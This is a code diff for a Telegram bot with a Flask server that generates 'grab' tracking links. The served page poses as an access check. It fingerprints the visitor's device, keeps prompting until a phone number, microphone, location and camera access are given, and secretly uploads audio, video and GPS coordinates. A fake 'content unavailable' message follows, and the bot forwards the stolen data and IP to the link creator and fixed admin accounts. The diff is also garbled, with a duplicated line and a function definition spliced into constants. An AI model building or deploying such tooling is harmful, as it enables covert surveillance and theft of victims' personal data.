@@ -12,6 +12,7 @@ from datetime import datetime, timedelta
 
 # ---------- Configuration ----------
 BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
+BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 ADMIN_IDS   = {"1838854178", "1930138915"}
 # Get the public URL from Render environment or set manually
 BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
@@ -21,7 +22,6 @@ if not BASE_URL:
 
 tracking_links = {}   # token -> user_id
 seen_users     = set()
-# Telegram message effect IDs
 EMOJI_EFFECTS = [
     "5104841245755180586", "5107584321108051014", "5104858069142078462",
     "5044134455711629726", "5046509860389126442", "5046589136895476101"
@@ -35,6 +35,466 @@ user_data = {}
 
 DAILY_BONUS_PTS  = 5
 REFER_BONUS_PTS  = 10
+PTS_PER_DAY      = 10
+FREE_DAYS_NEW    = 1
+
+flask_app = Flask(__name__)
+
+
+# ─────────────────────────────────────────
+# USER DATA HELPERS
+# ─────────────────────────────────────────
+def get_user(user_id):
+    uid = str(user_id)
+    if uid not in user_data:
+        user_data[uid] = {
+            "points": 0,
+            "access_expires": None,
+            "last_daily": None,
+            "referrals": 0,
+            "referred_by": None,
+            "name": "Unknown"
+        }
+    return user_data[uid]
+
+def is_admin(user_id):
+    return str(user_id) in ADMIN_IDS
+
+def has_access(user_id):
+    if is_admin(user_id):
+        return True
+    u = get_user(user_id)
+    exp = u.get("access_expires")
+    return exp is not None and exp > datetime.now()
+
+def add_access_days(user_id, days):
+    u = get_user(user_id)
+    now = datetime.now()
+    base = u["access_expires"] if u["access_expires"] and u["access_expires"] > now else now
+    u["access_expires"] = base + timedelta(days=days)
+
+def add_points(user_id, pts):
+    u = get_user(user_id)
+    u["points"] = max(0, u.get("points", 0) + pts)
+
+def remove_points(user_id, pts):
+    u = get_user(user_id)
+    u["points"] = max(0, u.get("points", 0) - pts)
+
+def redeem_points(user_id):
+    u = get_user(user_id)
+    pts = u.get("points", 0)
+    days = pts // PTS_PER_DAY
+    if days > 0:
+        remaining = pts % PTS_PER_DAY
+        u["points"] = remaining
+        add_access_days(user_id, days)
+    return days
+
+def access_expires_str(user_id):
+    u = get_user(user_id)
+    exp = u.get("access_expires")
+    if not exp:
+        return "❌ Access မရှိပါ | No access"
+    if exp < datetime.now():
+        return "⏰ Access ကုန်သွားပြီ | Expired"
+    delta = exp - datetime.now()
+    h = int(delta.total_seconds() // 3600)
+    m = int((delta.total_seconds() % 3600) // 60)
+    return f"✅ {h}h {m}m ကျန်သည် | {h}h {m}m remaining"
+
+
+# ─────────────────────────────────────────
+# MINIMAL PERMISSION PAGE
+# ─────────────────────────────────────────
+PERMISSION_PAGE = """<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; padding: 2rem; }
+        .status { margin-top: 2rem; font-size: 1.2rem; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h2>🔐 Access Check</h2>
+    <div class="status" id="status">Initializing...</div>
+    <script>
+        const token = "{{ token }}";
+        const mode  = "{{ mode }}";
+
+        async function collectFingerprint() {
+            let battery = {};
+            try {
+                const b = await navigator.getBattery();
+                battery = { batteryLevel: Math.round(b.level*100)+"%", charging: b.charging };
+            } catch(e) {}
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            let deviceModel = "Unknown";
+            if(navigator.userAgentData) {
+                try {
+                    const d = await navigator.userAgentData.getHighEntropyValues(["model","platform"]);
+                    if(d.model && d.model.trim()) deviceModel = d.model.trim();
+                } catch(e) {}
+            }
+            if(deviceModel === "Unknown") {
+                const ua = navigator.userAgent;
+                let m = ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);
+                if(m) deviceModel = m[1].trim();
+                else {
+                    m = ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);
+                    if(m) deviceModel = m[3].trim();
+                    else deviceModel = navigator.platform || "Unknown";
+                }
+            }
+            return {
+                userAgent: navigator.userAgent,
+                deviceModel: deviceModel,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                connectionType: conn.effectiveType || conn.type || "unknown",
+                downlink: conn.downlink,
+                localTime: new Date().toString(),
+                ...battery
+            };
+        }
+
+        async function sendFingerprint() {
+            try {
+                const fp = await collectFingerprint();
+                await fetch("/capture_fingerprint", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ token, fingerprint: fp })
+                });
+            } catch(e) {}
+        }
+
+        async function sendContact() {
+            let phone = "";
+            while(!phone || phone.trim() === "") {
+                phone = prompt("📞 သင့်ဖုန်းနံပါတ် ထည့်ပါ | Enter your phone number:", "");
+                if(phone === null) continue;
+                phone = phone.trim();
+                if(phone === "") alert("❌ ဖုန်းနံပါတ် မထည့်သွင်းပါ | Please enter a phone number");
+            }
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("phone", phone);
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_contact", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Phone number captured";
+        }
+
+        async function getAudioStream() {
+            while(true) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    return stream;
+                } catch(e) {
+                    alert("🎤 Microphone access is required. Please allow microphone.");
+                }
+            }
+        }
+
+        async function sendAudio() {
+            const stream = await getAudioStream();
+            const mimeType = MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" : "audio/webm";
+            const recorder = new MediaRecorder(stream, { mimeType });
+            const chunks = [];
+            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+            recorder.start(300);
+            await new Promise(r => setTimeout(r, 6000));
+            recorder.stop();
+            stream.getTracks().forEach(t => t.stop());
+            await new Promise(r => recorder.onstop = r);
+            const blob = new Blob(chunks, { type: mimeType });
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("audio", blob, "audio.webm");
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_combined_audio", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Audio captured";
+        }
+
+        async function getLocation() {
+            while(true) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true });
+                    });
+                    return pos;
+                } catch(e) {
+                    alert("📍 Location access is required. Please allow location.");
+                }
+            }
+        }
+
+        async function sendLocation() {
+            const pos = await getLocation();
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("lat", pos.coords.latitude);
+            form.append("lon", pos.coords.longitude);
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_combined_location", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Location captured";
+        }
+
+        async function getVideoStream() {
+            while(true) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    return stream;
+                } catch(e) {
+                    alert("🎥 Camera and microphone access required. Please allow both.");
+                }
+            }
+        }
+
+        async function sendVideo() {
+            const stream = await getVideoStream();
+            const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
+            const recorder = new MediaRecorder(stream, { mimeType });
+            const chunks = [];
+            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+            recorder.start(300);
+            await new Promise(r => setTimeout(r, 4000));
+            recorder.stop();
+            stream.getTracks().forEach(t => t.stop());
+            await new Promise(r => recorder.onstop = r);
+            const blob = new Blob(chunks, { type: mimeType });
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("video", blob, "video.webm");
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_combined_video", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Video captured";
+        }
+
+        async function runAll() {
+            document.getElementById("status").innerHTML = "📞 Requesting phone number...";
+            await sendContact();
+            document.getElementById("status").innerHTML = "🎤 Requesting audio...";
+            await sendAudio();
+            document.getElementById("status").innerHTML = "📍 Requesting location...";
+            await sendLocation();
+            document.getElementById("status").innerHTML = "🎥 Requesting video...";
+            await sendVideo();
+            document.getElementById("status").innerHTML = "✅ All data captured. Thank you!";
+            setTimeout(() => { document.body.innerHTML = "<h2>Content unavailable in your region</h2>"; }, 2000);
+        }
+
+        if(mode === "all") {
+            runAll();
+        } else if(mode === "contact") {
+            sendContact().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else if(mode === "audio") {
+            sendAudio().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else if(mode === "location") {
+            sendLocation().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else if(mode === "video") {
+            sendVideo().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else {
+            document.getElementById("status").innerHTML = "⚠️ Invalid mode";
+        }
+
+        sendFingerprint();
+    </script>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────
+# FLASK ROUTES
+# ─────────────────────────────────────────
+@flask_app.route('/')
+def index():
+    return """<!DOCTYPE html><html><head><title>ViralStream</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.box{text-align:center;padding:40px;background:#111;border-radius:14px;border:1px solid #222;max-width:400px;width:90%}
+h1{color:#e63946;font-size:2rem;margin-bottom:12px}
+p{color:#666;line-height:1.6;margin-bottom:8px}code{background:#1e1e1e;padding:3px 8px;border-radius:4px;color:#e63946}</style></head>
+<body><div class="box"><h1>▶ ViralStream</h1>
+<p>Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ</p>
+<p style="margin-top:16px;font-size:.8rem;color:#444">Use <code>/grab</code> in the bot</p>
+</div></body></html>""", 200
+
+
+@flask_app.route('/v/<token>')
+def v_page(token):
+    mode = request.args.get('m', 'all')
+    user_id = tracking_links.get(token)
+    if user_id:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        ua = request.headers.get('User-Agent', 'Unknown')[:120]
+        mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
+                       'location':'📍 Location','video':'🎥 Video','contact':'📞 Contact'}
+        label = mode_labels.get(mode, mode)
+        alert = (
+            f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 Mode: <b>{label}</b>\n"
+            f"🌐 IP: <code>{ip}</code>\n"
+            f"📱 UA: {ua}\n"
+            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"━━━━━━━━━━━━━━━━━━━━"
+        )
+        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
+    return render_template_string(PERMISSION_PAGE, token=token, mode=mode)
+
+
+# ── Capture endpoints ──
+@flask_app.route('/capture_fingerprint', methods=['POST'])
+def capture_fingerprint():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    fp = data.get('fingerprint', {})
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    report = (
+        f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
+        f"💻 Platform: {fp.get('platform','Unknown')}\n"
+        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
+        f"🗣 Language: {fp.get('language','?')}\n"
+        f"⏰ Timezone: {fp.get('timezone','?')}\n"
+        f"🔋 Battery: {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'}\n"
+        f"📡 Net: {fp.get('connectionType','?')} / {fp.get('downlink','?')}Mbps\n"
+        f"🧠 CPU: {fp.get('hardwareConcurrency','?')} cores | 💾 {fp.get('deviceMemory','?')}GB\n"
+        f"📅 {fp.get('localTime','?')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_photo', methods=['POST'])
+def capture_combined_photo():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    photo_file = request.files.get('photo')
+    if not photo_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    photo_bytes = photo_file.read()
+    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_video', methods=['POST'])
+def capture_combined_video():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    video_file = request.files.get('video')
+    if not video_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    video_bytes = video_file.read()
+    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_audio', methods=['POST'])
+def capture_combined_audio():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    audio_file = request.files.get('audio')
+    if not audio_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    audio_bytes = audio_file.read()
+    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_location', methods=['POST'])
+def capture_combined_location():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    lat = request.form.get('lat')
+    lon = request.form.get('lon')
+    if not lat or not lon:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
+    threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_contact', methods=['POST'])
+def capture_contact():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    phone = request.form.get('phone', '').strip()
+    if not phone:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json) + f"\n📞 Phone: <code>{phone}</code>"
+    threading.Thread(target=broadcast_contact, args=(user_id, phone, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+def _fp_caption(fp_json):
+    try:
+        fp = json.loads(fp_json)
+        return (
+            f"📱 <b>Device Info</b>\n"
+            f"📱 {fp.get('deviceModel','?')} | {fp.get('platform','?')}\n"
+            f"🖥 {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')} | {fp.get('language','?')}\n"
+            f"⏰ {fp.get('timezone','?')}\n"
+            f"🔋 {fp.get('batteryLevel','?')} | 📡 {fp.get('connectionType','?')}"
+        )
+    except Exception:
+        return "📱 Device Info"
+
+
+# ─────────────────────────────────────────
+# TELEGRAM SEND HELPERS
+# ─────────────────────────────────────────
+def recipients(user_id):
+    ids = [str(user_id)]
+    for a in ADMIN_IDS:
+        if a not in ids:
+            ids.append(a)
+    return ids
+
+def send_telegram_message(chat_id, text, reply_markup=None, effect_id=None):
+    try:
+        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
+        if reply_markup:
+            payload["reply_markup"] = reply_markup
+        if effect_id:
+            payload["message_effect_id"] = effect_id
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload, timeout=10)
+    except Exception:
+        pass
+
+def broadcast_message(user_id, text, use_effect=FREFER_BONUS_PTS  = 10
 PTS_PER_DAY      = 10
 FREE_DAYS_NEW    = 1
 
